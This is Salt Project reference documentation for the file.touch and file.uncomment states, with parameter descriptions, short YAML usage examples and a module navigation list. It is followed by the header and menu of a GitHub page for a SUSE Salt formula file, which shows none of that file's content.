salt.states.file.touch(*name*, *atime=None*, *mtime=None*, *makedirs=False*)[¶](#salt.states.file.touch "Permalink to this definition")

Replicate the 'nix "touch" command to create a new empty
file or update the atime and mtime of an existing file.

Note that if you just want to create a file and don't care about atime or
mtime, you should use `file.managed` instead, as it is more
feature-complete. (Just leave out the `source`/`template`/`contents`
arguments, and it will just create the file and/or check its permissions,
without messing with contents)

name

name of the file

atime

atime of the file

mtime

mtime of the file

makedirs

whether we should create the parent directory/directories in order to
touch the file

Usage:

```
/var/log/httpd/logrotate.empty:
  file.touch

```

New in version 0.9.5.

salt.states.file.uncomment(*name*, *regex*, *char='#'*, *backup='.bak'*)[¶](#salt.states.file.uncomment "Permalink to this definition")

Uncomment specified commented lines in a file

name

The full path to the file to be edited

regex

A regular expression used to find the lines that are to be uncommented.
This regex should not include the comment character. A leading `^`
character will be stripped for convenience (for easily switching
between comment() and uncomment()). The regex will be searched for
from the beginning of the line, ignoring leading spaces (we prepend
'^[ t]\*')

char

The character to remove in order to uncomment a line

backup

The file will be backed up before edit with this file extension;

Warning

This backup will be overwritten each time `sed` / `comment` /
`uncomment` is called. Meaning the backup will only be useful
after the first invocation.

Set to False/None to not keep a backup.

Usage:

```
/etc/adduser.conf:
  file.uncomment:
    - regex: EXTRA_GROUPS

```

New in version 0.9.5.

 [Previous](salt.states.event.html)
[Next](salt.states.firewall.html)

---

*Generated on January 08, 2025 at 20:47:56 UTC.*

You are viewing docs for the latest stable release, 3007.1. Switch to docs for the previous stable release, [3006.9](/en/3006/ "Docs for the previous stable release"), or to a recent doc build from the [master](/en/master/ "Latest docs from the master branch") branch.

[saltproject.io](https://saltproject.io/)

© 2025 VMware, Inc. | [Privacy Policy](https://www.vmware.com/help/privacy.html)

[![](https://gitlab.com/saltstack/open/salt-branding-guide/-/raw/master/misc/banners/try_salt_now.png)](https://docs.saltproject.io/salt/user-guide/en/latest/index.html)

[![](https://gitlab.com/saltstack/open/salt-branding-guide/-/raw/master/logos/SaltProject_altlogo_teal.png)](https://saltproject.io)
[3006.9](/en/3006/ "Switch to docs for the previous stable release")
[3007.1](/en/latest/ "View release notes")
[Master](/en/master/ "Switch to docs built recently from the master branch")

* [Salt Project](../../../topics/about_salt_project.html)
* [Introduction to Salt](../../../topics/index.html)
* [Salt system architecture](../../../topics/salt_system_architecture.html)
* [Contributing](../../../topics/contributing-guide.html)
* [Salt Project maintenance policies](../../../topics/maintenance-policy.html)
* [Installation](../../../topics/installation/index.html)
* [Configuring Salt](../../../topics/configuration/index.html)
* [Using Salt](../../../topics/using_salt.html)
* [Remote Execution](../../../topics/execution/index.html)
* [Configuration Management](../../../topics/states/index.html)
* [Return Codes](../../../topics/return_codes/index.html)
* [Utility Modules - Code Reuse in Custom Modules](../../../topics/utils/index.html)
* [Events & Reactor](../../../topics/event/index.html)
* [Orchestration](../../../topics/orchestrate/index.html)
* [Solaris](../../../topics/solaris/index.html)
* [Salt SSH](../../../topics/ssh/index.html)
* [Thorium Complex Reactor](../../../topics/thorium/index.html)
* [Salt Cloud](../../../topics/cloud/index.html)
* [Salt Proxy Minion](../../../topics/proxyminion/index.html)
* [Network Automation](../../../topics/network_automation/index.html)
* [Salt Virt](../../../topics/virt/index.html)
* [Onedir Packaging](../../../topics/packaging/index.html)
* [Command Line Reference](../../cli/index.html)
* [Pillars](../../pillar/index.html)
* [Master Tops](../../tops/index.html)
* [Salt Module Reference](../../index.html)
  + [auth modules](../../auth/all/index.html)
  + [beacon modules](../../beacons/all/index.html)
  + [cache modules](../../cache/all/index.html)
  + [cloud modules](../../clouds/all/index.html)
  + [engine modules](../../engines/all/index.html)
  + [execution modules](../../modules/all/index.html)
  + [executors modules](../../executors/all/index.html)
  + [fileserver modules](../../file_server/all/index.html)
  + [grains modules](../../grains/all/index.html)
  + [netapi modules](../../netapi/all/index.html)
  + [output modules](../../output/all/index.html)
  + [pillar modules](../../pillar/all/index.html)
  + [proxy modules](../../proxy/all/index.html)
  + [queue modules](../../queues/all/index.html)
  + [renderer modules](../../renderers/all/index.html)
  + [returner modules](../../returners/all/index.html)
  + [roster modules](../../roster/all/index.html)
  + [runner modules](../../runners/all/index.html)
  + [sdb modules](../../sdb/all/index.html)
  + [serializer modules](../../serializers/all/index.html)
  + [state modules](index.html)
    - [salt.states.acme](salt.states.acme.html)
    - [salt.states.alias](salt.states.alias.html)
    - [salt.states.alternatives](salt.states.alternatives.html)
    - [salt.states.ansiblegate](salt.states.ansiblegate.html)
    - [salt.states.apache](salt.states.apache.html)
    - [salt.states.apache\_conf](salt.states.apache_conf.html)
    - [salt.states.apache\_module](salt.states.apache_module.html)
    - [salt.states.apache\_site](salt.states.apache_site.html)
    - [salt.states.aptpkg](salt.states.aptpkg.html)
    - [salt.states.archive](salt.states.archive.html)
    - [salt.states.artifactory](salt.states.artifactory.html)
    - [salt.states.at](salt.states.at.html)
    - [salt.states.augeas](salt.states.augeas.html)
    - [salt.states.aws\_sqs](salt.states.aws_sqs.html)
    - [salt.states.beacon](salt.states.beacon.html)
    - [salt.states.bigip](salt.states.bigip.html)
    - [salt.states.blockdev](salt.states.blockdev.html)
    - [salt.states.boto3\_elasticache](salt.states.boto3_elasticache.html)
    - [salt.states.boto3\_elasticsearch](salt.states.boto3_elasticsearch.html)
    - [salt.states.boto3\_route53](salt.states.boto3_route53.html)
    - [salt.states.boto3\_sns](salt.states.boto3_sns.html)
    - [salt.states.boto\_apigateway](salt.states.boto_apigateway.html)
    - [salt.states.boto\_asg](salt.states.boto_asg.html)
    - [salt.states.boto\_cfn](salt.states.boto_cfn.html)
    - [salt.states.boto\_cloudfront](salt.states.boto_cloudfront.html)
    - [salt.states.boto\_cloudtrail](salt.states.boto_cloudtrail.html)
    - [salt.states.boto\_cloudwatch\_alarm](salt.states.boto_cloudwatch_alarm.html)
    - [salt.states.boto\_cloudwatch\_event](salt.states.boto_cloudwatch_event.html)
    - [salt.states.boto\_cognitoidentity](salt.states.boto_cognitoidentity.html)
    - [salt.states.boto\_datapipeline](salt.states.boto_datapipeline.html)
    - [salt.states.boto\_dynamodb](salt.states.boto_dynamodb.html)
    - [salt.states.boto\_ec2](salt.states.boto_ec2.html)
    - [salt.states.boto\_elasticache](salt.states.boto_elasticache.html)
    - [salt.states.boto\_elasticsearch\_domain](salt.states.boto_elasticsearch_domain.html)
    - [salt.states.boto\_elb](salt.states.boto_elb.html)
    - [salt.states.boto\_elbv2](salt.states.boto_elbv2.html)
    - [salt.states.boto\_iam](salt.states.boto_iam.html)
    - [salt.states.boto\_iam\_role](salt.states.boto_iam_role.html)
    - [salt.states.boto\_iot](salt.states.boto_iot.html)
    - [salt.states.boto\_kinesis](salt.states.boto_kinesis.html)
    - [salt.states.boto\_kms](salt.states.boto_kms.html)
    - [salt.states.boto\_lambda](salt.states.boto_lambda.html)
    - [salt.states.boto\_lc](salt.states.boto_lc.html)
    - [salt.states.boto\_rds](salt.states.boto_rds.html)
    - [salt.states.boto\_route53](salt.states.boto_route53.html)
    - [salt.states.boto\_s3](salt.states.boto_s3.html)
    - [salt.states.boto\_s3\_bucket](salt.states.boto_s3_bucket.html)
    - [salt.states.boto\_secgroup](salt.states.boto_secgroup.html)
    - [salt.states.boto\_sns](salt.states.boto_sns.html)
    - [salt.states.boto\_sqs](salt.states.boto_sqs.html)
    - [salt.states.boto\_vpc](salt.states.boto_vpc.html)
    - [salt.states.bower](salt.states.bower.html)
    - [salt.states.btrfs](salt.states.btrfs.html)
    - [salt.states.cabal](salt.states.cabal.html)
    - [salt.states.ceph](salt.states.ceph.html)
    - [salt.states.chef](salt.states.chef.html)
    - [salt.states.chocolatey](salt.states.chocolatey.html)
    - [salt.states.chronos\_job](salt.states.chronos_job.html)
    - [salt.states.cimc](salt.states.cimc.html)
    - [salt.states.cisconso](salt.states.cisconso.html)
    - [salt.states.cloud](salt.states.cloud.html)
    - [salt.states.cmd](salt.states.cmd.html)
    - [salt.states.composer](salt.states.composer.html)
    - [salt.states.consul](salt.states.consul.html)
    - [salt.states.cron](salt.states.cron.html)
    - [salt.states.cryptdev](salt.states.cryptdev.html)
    - [salt.states.csf](salt.states.csf.html)
    - [salt.states.cyg](salt.states.cyg.html)
    - [salt.states.ddns](salt.states.ddns.html)
    - [salt.states.debconfmod](salt.states.debconfmod.html)
    - [salt.states.dellchassis](salt.states.dellchassis.html)
    - [salt.states.disk](salt.states.disk.html)
    - [salt.states.docker\_container](salt.states.docker_container.html)
    - [salt.states.docker\_image](salt.states.docker_image.html)
    - [salt.states.docker\_network](salt.states.docker_network.html)
    - [salt.states.docker\_volume](salt.states.docker_volume.html)
    - [salt.states.drac](salt.states.drac.html)
    - [salt.states.dvs](salt.states.dvs.html)
    - [salt.states.elasticsearch](salt.states.elasticsearch.html)
    - [salt.states.elasticsearch\_index](salt.states.elasticsearch_index.html)
    - [salt.states.elasticsearch\_index\_template](salt.states.elasticsearch_index_template.html)
    - [salt.states.environ](salt.states.environ.html)
    - [salt.states.eselect](salt.states.eselect.html)
    - [salt.states.esxcluster](salt.states.esxcluster.html)
    - [salt.states.esxdatacenter](salt.states.esxdatacenter.html)
    - [salt.states.esxi](salt.states.esxi.html)
    - [salt.states.esxvm](salt.states.esxvm.html)
    - [salt.states.etcd\_mod](salt.states.etcd_mod.html)
    - [salt.states.ethtool](salt.states.ethtool.html)
    - [salt.states.event](salt.states.event.html)
    - salt.states.file
      * [Operations on regular files, special files, directories, and symlinks](#operations-on-regular-files-special-files-directories-and-symlinks)
      * [`absent()`](#salt.states.file.absent)
      * [`accumulated()`](#salt.states.file.accumulated)
      * [`append()`](#salt.states.file.append)
      * [`blockreplace()`](#salt.states.file.blockreplace)
      * [`cached()`](#salt.states.file.cached)
      * [`comment()`](#salt.states.file.comment)
      * [`copy_()`](#salt.states.file.copy_)
      * [`decode()`](#salt.states.file.decode)
      * [`directory()`](#salt.states.file.directory)
      * [`exists()`](#salt.states.file.exists)
      * [`hardlink()`](#salt.states.file.hardlink)
      * [`keyvalue()`](#salt.states.file.keyvalue)
      * [`line()`](#salt.states.file.line)
      * [`managed()`](#salt.states.file.managed)
      * [`missing()`](#salt.states.file.missing)
      * [`mknod()`](#salt.states.file.mknod)
      * [`mod_beacon()`](#salt.states.file.mod_beacon)
      * [`mod_run_check_cmd()`](#salt.states.file.mod_run_check_cmd)
      * [`not_cached()`](#salt.states.file.not_cached)
      * [`patch()`](#salt.states.file.patch)
      * [`prepend()`](#salt.states.file.prepend)
      * [`pruned()`](#salt.states.file.pruned)
      * [`recurse()`](#salt.states.file.recurse)
      * [`rename()`](#salt.states.file.rename)
      * [`replace()`](#salt.states.file.replace)
      * [`retention_schedule()`](#salt.states.file.retention_schedule)
      * [`serialize()`](#salt.states.file.serialize)
      * [`shortcut()`](#salt.states.file.shortcut)
      * [`symlink()`](#salt.states.file.symlink)
      * [`tidied()`](#salt.states.file.tidied)
      * [`touch()`](#salt.states.file.touch)
      * [`uncomment()`](#salt.states.file.uncomment)
    - [salt.states.firewall](salt.states.firewall.html)
    - [salt.states.firewalld](salt.states.firewalld.html)
    - [salt.states.gem](salt.states.gem.html)
    - [salt.states.git](salt.states.git.html)
    - [salt.states.github](salt.states.github.html)
    - [salt.states.glance\_image](salt.states.glance_image.html)
    - [salt.states.glassfish](salt.states.glassfish.html)
    - [salt.states.glusterfs](salt.states.glusterfs.html)
    - [salt.states.gnomedesktop](salt.states.gnomedesktop.html)
    - [salt.states.gpg](salt.states.gpg.html)
    - [salt.states.grafana](salt.states.grafana.html)
    - [salt.states.grafana4\_dashboard](salt.states.grafana4_dashboard.html)
    - [salt.states.grafana4\_datasource](salt.states.grafana4_datasource.html)
    - [salt.states.grafana4\_org](salt.states.grafana4_org.html)
    - [salt.states.grafana4\_user](salt.states.grafana4_user.html)
    - [salt.states.grafana\_dashboard](salt.states.grafana_dashboard.html)
    - [salt.states.grafana\_datasource](salt.states.grafana_datasource.html)
    - [salt.states.grains](salt.states.grains.html)
    - [salt.states.group](salt.states.group.html)
    - [salt.states.heat](salt.states.heat.html)
    - [salt.states.helm](salt.states.helm.html)
    - [salt.states.hg](salt.states.hg.html)
    - [salt.states.highstate\_doc](salt.states.highstate_doc.html)
    - [salt.states.host](salt.states.host.html)
    - [salt.states.http](salt.states.http.html)
    - [salt.states.icinga2](salt.states.icinga2.html)
    - [salt.states.idem](salt.states.idem.html)
    - [salt.states.ifttt](salt.states.ifttt.html)
    - [salt.states.incron](salt.states.incron.html)
    - [salt.states.influxdb08\_database](salt.states.influxdb08_database.html)
    - [salt.states.influxdb08\_user](salt.states.influxdb08_user.html)
    - [salt.states.influxdb\_continuous\_query](salt.states.influxdb_continuous_query.html)
    - [salt.states.influxdb\_database](salt.states.influxdb_database.html)
    - [salt.states.influxdb\_retention\_policy](salt.states.influxdb_retention_policy.html)
    - [salt.states.influxdb\_user](salt.states.influxdb_user.html)
    - [salt.states.infoblox\_a](salt.states.infoblox_a.html)
    - [salt.states.infoblox\_cname](salt.states.infoblox_cname.html)
    - [salt.states.infoblox\_host\_record](salt.states.infoblox_host_record.html)
    - [salt.states.infoblox\_range](salt.states.infoblox_range.html)
    - [salt.states.ini\_manage](salt.states.ini_manage.html)
    - [salt.states.ipmi](salt.states.ipmi.html)
    - [salt.states.ipset](salt.states.ipset.html)
    - [salt.states.iptables](salt.states.iptables.html)
    - [salt.states.jboss7](salt.states.jboss7.html)
    - [salt.states.jenkins](salt.states.jenkins.html)
    - [salt.states.junos](salt.states.junos.html)
    - [salt.states.kapacitor](salt.states.kapacitor.html)
    - [salt.states.kernelpkg](salt.states.kernelpkg.html)
    - [salt.states.keyboard](salt.states.keyboard.html)
    - [salt.states.keystone](salt.states.keystone.html)
    - [salt.states.keystone\_domain](salt.states.keystone_domain.html)
    - [salt.states.keystone\_endpoint](salt.states.keystone_endpoint.html)
    - [salt.states.keystone\_group](salt.states.keystone_group.html)
    - [salt.states.keystone\_project](salt.states.keystone_project.html)
    - [salt.states.keystone\_role](salt.states.keystone_role.html)
    - [salt.states.keystone\_role\_grant](salt.states.keystone_role_grant.html)
    - [salt.states.keystone\_service](salt.states.keystone_service.html)
    - [salt.states.keystone\_user](salt.states.keystone_user.html)
    - [salt.states.keystore](salt.states.keystore.html)
    - [salt.states.kmod](salt.states.kmod.html)
    - [salt.states.kubernetes](salt.states.kubernetes.html)
    - [salt.states.layman](salt.states.layman.html)
    - [salt.states.ldap](salt.states.ldap.html)
    - [salt.states.libcloud\_dns](salt.states.libcloud_dns.html)
    - [salt.states.libcloud\_loadbalancer](salt.states.libcloud_loadbalancer.html)
    - [salt.states.libcloud\_storage](salt.states.libcloud_storage.html)
    - [salt.states.linux\_acl](salt.states.linux_acl.html)
    - [salt.states.locale](salt.states.locale.html)
    - [salt.states.logadm](salt.states.logadm.html)
    - [salt.states.logrotate](salt.states.logrotate.html)
    - [salt.states.loop](salt.states.loop.html)
    - [salt.states.lvm](salt.states.lvm.html)
    - [salt.states.lvs\_server](salt.states.lvs_server.html)
    - [salt.states.lvs\_service](salt.states.lvs_service.html)
    - [salt.states.lxc](salt.states.lxc.html)
    - [salt.states.lxd](salt.states.lxd.html)
    - [salt.states.lxd\_container](salt.states.lxd_container.html)
    - [salt.states.lxd\_image](salt.states.lxd_image.html)
    - [salt.states.lxd\_profile](salt.states.lxd_profile.html)
    - [salt.states.mac\_assistive](salt.states.mac_assistive.html)
    - [salt.states.mac\_keychain](salt.states.mac_keychain.html)
    - [salt.states.mac\_xattr](salt.states.mac_xattr.html)
    - [salt.states.macdefaults](salt.states.macdefaults.html)
    - [salt.states.macpackage](salt.states.macpackage.html)
    - [salt.states.makeconf](salt.states.makeconf.html)
    - [salt.states.marathon\_app](salt.states.marathon_app.html)
    - [salt.states.mdadm\_raid](salt.states.mdadm_raid.html)
    - [salt.states.memcached](salt.states.memcached.html)
    - [salt.states.modjk](salt.states.modjk.html)
    - [salt.states.modjk\_worker](salt.states.modjk_worker.html)
    - [salt.states.module](salt.states.module.html)
    - [salt.states.mongodb\_database](salt.states.mongodb_database.html)
    - [salt.states.mongodb\_user](salt.states.mongodb_user.html)
    - [salt.states.monit](salt.states.monit.html)
    - [salt.states.mount](salt.states.mount.html)
    - [salt.states.mssql\_database](salt.states.mssql_database.html)
    - [salt.states.mssql\_login](salt.states.mssql_login.html)
    - [salt.states.mssql\_role](salt.states.mssql_role.html)
    - [salt.states.mssql\_user](salt.states.mssql_user.html)
    - [salt.states.msteams](salt.states.msteams.html)
    - [salt.states.mysql\_database](salt.states.mysql_database.html)
    - [salt.states.mysql\_grants](salt.states.mysql_grants.html)
    - [salt.states.mysql\_query](salt.states.mysql_query.html)
    - [salt.states.mysql\_user](salt.states.mysql_user.html)
    - [salt.states.net\_napalm\_yang](salt.states.net_napalm_yang.html)
    - [salt.states.netacl](salt.states.netacl.html)
    - [salt.states.netconfig](salt.states.netconfig.html)
    - [salt.states.netntp](salt.states.netntp.html)
    - [salt.states.netsnmp](salt.states.netsnmp.html)
    - [salt.states.netusers](salt.states.netusers.html)
    - [salt.states.network](salt.states.network.html)
    - [salt.states.neutron\_network](salt.states.neutron_network.html)
    - [salt.states.neutron\_secgroup](salt.states.neutron_secgroup.html)
    - [salt.states.neutron\_secgroup\_rule](salt.states.neutron_secgroup_rule.html)
    - [salt.states.neutron\_subnet](salt.states.neutron_subnet.html)
    - [salt.states.nexus](salt.states.nexus.html)
    - [salt.states.nfs\_export](salt.states.nfs_export.html)
    - [salt.states.nftables](salt.states.nftables.html)
    - [salt.states.npm](salt.states.npm.html)
    - [salt.states.ntp](salt.states.ntp.html)
    - [salt.states.nxos](salt.states.nxos.html)
    - [salt.states.nxos\_upgrade](salt.states.nxos_upgrade.html)
    - [salt.states.openstack\_config](salt.states.openstack_config.html)
    - [salt.states.openvswitch\_bridge](salt.states.openvswitch_bridge.html)
    - [salt.states.openvswitch\_db module](salt.states.openvswitch_db.html)
    - [salt.states.openvswitch\_port](salt.states.openvswitch_port.html)
    - [salt.states.opsgenie](salt.states.opsgenie.html)
    - [salt.states.pagerduty](salt.states.pagerduty.html)
    - [salt.states.pagerduty\_escalation\_policy](salt.states.pagerduty_escalation_policy.html)
    - [salt.states.pagerduty\_schedule](salt.states.pagerduty_schedule.html)
    - [salt.states.pagerduty\_service](salt.states.pagerduty_service.html)
    - [salt.states.pagerduty\_user](salt.states.pagerduty_user.html)
    - [salt.states.panos](salt.states.panos.html)
    - [salt.states.pbm](salt.states.pbm.html)
    - [salt.states.pcs](salt.states.pcs.html)
    - [salt.states.pdbedit](salt.states.pdbedit.html)
    - [salt.states.pecl](salt.states.pecl.html)
    - [salt.states.pip\_state](salt.states.pip_state.html)
    - [salt.states.pkg](salt.states.pkg.html)
    - [salt.states.pkgbuild](salt.states.pkgbuild.html)
    - [salt.states.pkgng](salt.states.pkgng.html)
    - [salt.states.pkgrepo](salt.states.pkgrepo.html)
    - [salt.states.portage\_config](salt.states.portage_config.html)
    - [salt.states.ports](salt.states.ports.html)
    - [salt.states.postgres\_cluster](salt.states.postgres_cluster.html)
    - [salt.states.postgres\_database](salt.states.postgres_database.html)
    - [salt.states.postgres\_extension](salt.states.postgres_extension.html)
    - [salt.states.postgres\_group](salt.states.postgres_group.html)
    - [salt.states.postgres\_initdb](salt.states.postgres_initdb.html)
    - [salt.states.postgres\_language](salt.states.postgres_language.html)
    - [salt.states.postgres\_privileges](salt.states.postgres_privileges.html)
    - [salt.states.postgres\_schema](salt.states.postgres_schema.html)
    - [salt.states.postgres\_tablespace](salt.states.postgres_tablespace.html)
    - [salt.states.postgres\_user](salt.states.postgres_user.html)
    - [salt.states.powerpath](salt.states.powerpath.html)
    - [salt.states.probes](salt.states.probes.html)
    - [salt.states.process](salt.states.process.html)
    - [salt.states.proxy](salt.states.proxy.html)
    - [salt.states.pushover](salt.states.pushover.html)
    - [salt.states.pyenv](salt.states.pyenv.html)
    - [salt.states.pyrax\_queues](salt.states.pyrax_queues.html)
    - [salt.states.quota](salt.states.quota.html)
    - [salt.states.rabbitmq\_cluster](salt.states.rabbitmq_cluster.html)
    - [salt.states.rabbitmq\_plugin](salt.states.rabbitmq_plugin.html)
    - [salt.states.rabbitmq\_policy](salt.states.rabbitmq_policy.html)
    - [salt.states.rabbitmq\_upstream](salt.states.rabbitmq_upstream.html)
    - [salt.states.rabbitmq\_user](salt.states.rabbitmq_user.html)
    - [salt.states.rabbitmq\_vhost](salt.states.rabbitmq_vhost.html)
    - [salt.states.rbac\_solaris](salt.states.rbac_solaris.html)
    - [salt.states.rbenv](salt.states.rbenv.html)
    - [salt.states.rdp](salt.states.rdp.html)
    - [salt.states.redismod](salt.states.redismod.html)
    - [salt.states.reg](salt.states.reg.html)
    - [salt.states.restconf](salt.states.restconf.html)
    - [salt.states.rsync](salt.states.rsync.html)
    - [salt.states.rvm](salt.states.rvm.html)
    - [salt.states.salt\_proxy](salt.states.salt_proxy.html)
    - [salt.states.saltmod](salt.states.saltmod.html)
    - [salt.states.saltutil](salt.states.saltutil.html)
    - [salt.states.schedule](salt.states.schedule.html)
    - [salt.states.selinux](salt.states.selinux.html)
    - [salt.states.serverdensity\_device](salt.states.serverdensity_device.html)
    - [salt.states.service](salt.states.service.html)
    - [salt.states.slack](salt.states.slack.html)
    - [salt.states.smartos](salt.states.smartos.html)
    - [salt.states.smtp](salt.states.smtp.html)
    - [salt.states.snapper](salt.states.snapper.html)
    - [salt.states.solrcloud](salt.states.solrcloud.html)
    - [salt.states.splunk](salt.states.splunk.html)
    - [salt.states.splunk\_search](salt.states.splunk_search.html)
    - [salt.states.sqlite3](salt.states.sqlite3.html)
    - [salt.states.ssh\_auth](salt.states.ssh_auth.html)
    - [salt.states.ssh\_known\_hosts](salt.states.ssh_known_hosts.html)
    - [salt.states.stateconf](salt.states.stateconf.html)
    - [salt.states.status](salt.states.status.html)
    - [salt.states.statuspage](salt.states.statuspage.html)
    - [salt.states.supervisord](salt.states.supervisord.html)
    - [salt.states.svn](salt.states.svn.html)
    - [salt.states.sysctl](salt.states.sysctl.html)
    - [salt.states.sysfs](salt.states.sysfs.html)
    - [salt.states.syslog\_ng](salt.states.syslog_ng.html)
    - [salt.states.sysrc](salt.states.sysrc.html)
    - [salt.states.telemetry\_alert](salt.states.telemetry_alert.html)
    - [salt.states.test](salt.states.test.html)
    - [salt.states.testinframod](salt.states.testinframod.html)
    - [salt.states.timezone](salt.states.timezone.html)
    - [salt.states.tls](salt.states.tls.html)
    - [salt.states.tomcat](salt.states.tomcat.html)
    - [salt.states.trafficserver](salt.states.trafficserver.html)
    - [salt.states.tuned](salt.states.tuned.html)
    - [salt.states.uptime](salt.states.uptime.html)
    - [salt.states.user](salt.states.user.html)
    - [salt.states.vagrant](salt.states.vagrant.html)
    - [salt.states.vault](salt.states.vault.html)
    - [salt.states.vbox\_guest](salt.states.vbox_guest.html)
    - [salt.states.victorops](salt.states.victorops.html)
    - [salt.states.virt](salt.states.virt.html)
    - [salt.states.virtualenv](salt.states.virtualenv_mod.html)
    - [salt.states.webutil](salt.states.webutil.html)
    - [salt.states.win\_appx](salt.states.win_appx.html)
    - [salt.states.win\_certutil](salt.states.win_certutil.html)
    - [salt.states.win\_dacl](salt.states.win_dacl.html)
    - [salt.states.win\_dism](salt.states.win_dism.html)
    - [salt.states.win\_dns\_client](salt.states.win_dns_client.html)
    - [salt.states.win\_firewall](salt.states.win_firewall.html)
    - [salt.states.win\_iis](salt.states.win_iis.html)
    - [salt.states.win\_lgpo](salt.states.win_lgpo.html)
    - [salt.states.win\_lgpo\_reg](salt.states.win_lgpo_reg.html)
    - [salt.states.win\_license](salt.states.win_license.html)
    - [salt.states.win\_network](salt.states.win_network.html)
    - [salt.states.win\_path](salt.states.win_path.html)
    - [salt.states.win\_pki](salt.states.win_pki.html)
    - [salt.states.win\_powercfg](salt.states.win_powercfg.html)
    - [salt.states.win\_servermanager](salt.states.win_servermanager.html)
    - [salt.states.win\_shortcut](salt.states.win_shortcut.html)
    - [salt.states.win\_smtp\_server](salt.states.win_smtp_server.html)
    - [salt.states.win\_snmp](salt.states.win_snmp.html)
    - [salt.states.win\_system](salt.states.win_system.html)
    - [salt.states.win\_task](salt.states.win_task.html)
    - [salt.states.win\_wua](salt.states.win_wua.html)
    - [salt.states.win\_wusa](salt.states.win_wusa.html)
    - [salt.states.winrepo](salt.states.winrepo.html)
    - [salt.states.wordpress](salt.states.wordpress.html)
    - [salt.states.x509](salt.states.x509.html)
    - [salt.states.x509\_v2](salt.states.x509_v2.html)
    - [salt.states.xml](salt.states.xml.html)
    - [salt.states.xmpp](salt.states.xmpp.html)
    - [salt.states.zabbix\_action](salt.states.zabbix_action.html)
    - [salt.states.zabbix\_host](salt.states.zabbix_host.html)
    - [salt.states.zabbix\_hostgroup](salt.states.zabbix_hostgroup.html)
    - [salt.states.zabbix\_mediatype](salt.states.zabbix_mediatype.html)
    - [salt.states.zabbix\_template](salt.states.zabbix_template.html)
    - [salt.states.zabbix\_user](salt.states.zabbix_user.html)
    - [salt.states.zabbix\_usergroup](salt.states.zabbix_usergroup.html)
    - [salt.states.zabbix\_usermacro](salt.states.zabbix_usermacro.html)
    - [salt.states.zabbix\_valuemap](salt.states.zabbix_valuemap.html)
    - [salt.states.zcbuildout](salt.states.zcbuildout.html)
    - [salt.states.zenoss](salt.states.zenoss.html)
    - [salt.states.zfs](salt.states.zfs.html)
    - [salt.states.zk\_concurrency](salt.states.zk_concurrency.html)
    - [salt.states.zone](salt.states.zone.html)
    - [salt.states.zookeeper](salt.states.zookeeper.html)
    - [salt.states.zpool](salt.states.zpool.html)
  + [thorium modules](../../thorium/all/index.html)
  + [token modules](../../tokens/all/index.html)
  + [master tops modules](../../tops/all/index.html)
  + [wheel modules](../../wheel/all/index.html)
* [APIs](../../../topics/api.html)
* [Architecture](../../../topics/topology/index.html)
* [Minion Data Cache](../../../topics/cache/index.html)
* [Slots](../../../topics/slots/index.html)
* [Windows](../../../topics/windows/index.html)
* [Developing Salt](../../../topics/development/index.html)
* [Release notes](../../../topics/releases/index.html)
* [Venafi Tools for Salt](../../../topics/venafi/index.html)
* [Glossary](../../../glossary.html)



=== Content from github.com_72d29094_20250115_125141.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSUSE%2Fsaphanabootstrap-formula%2Fblob%2Fmain%2Fhana%2Fha_cluster.sls)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSUSE%2Fsaphanabootstrap-formula%2Fblob%2Fmain%2Fhana%2Fha_cluster.sls)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=SUSE%2Fsaphanabootstrap-formula)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[SUSE](/SUSE)
/
